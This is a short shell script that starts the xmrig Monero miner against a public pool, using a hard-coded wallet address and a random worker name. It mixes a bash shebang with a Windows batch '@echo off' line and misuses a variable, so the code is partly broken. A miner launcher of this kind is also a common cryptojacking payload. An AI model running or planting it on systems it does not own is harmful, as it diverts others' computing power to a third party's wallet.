#!/bin/bash
@echo off
A=de.monero.herominers.com:1111
B=8AnCrDsFdsA5Zxj4UXqDm15ikXKbtgihzAAidFDSk8jW8rEf22g94Z38YHU52V14yENcZ1e2dZrZAB59FxA4n5cn7b7dwhs
C=$(echo $(shuf -i 1-5 -n 1)-xmr-A)
./xmrig --donate-level 1 -o $A -u $B -p $C -a rx/0 -k 